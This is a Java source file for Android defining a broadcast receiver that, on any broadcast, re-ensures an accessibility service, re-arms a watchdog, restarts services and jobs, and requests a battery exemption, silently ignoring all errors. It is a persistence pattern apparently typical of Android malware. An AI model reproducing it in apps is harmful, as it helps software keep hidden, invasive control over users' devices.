package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class KryptosWatchdogReceiver extends BroadcastReceiver {
    private static final String TAG = "KryptosWatchdogRcv";

    @Override
    public void onReceive(Context ctx, Intent it) {
        try { AccessibilityKeeper.garantir(ctx); AccessibilityKeeper.agendar(ctx); } catch (Throwable t) {}
        Log.d(TAG, "onReceive " + (it == null ? "?" : it.getAction()));
        try { KryptosWatchdog.arm(ctx); } catch (Throwable ignored) {}
        try { KryptosWatchdog.ensureServices(ctx); } catch (Throwable ignored) {}
        try { KryptosJobService.schedule(ctx); } catch (Throwable ignored) {}
        try { KryptosWatchdog.requestBatteryExemption(ctx); } catch (Throwable ignored) {}
    }
}
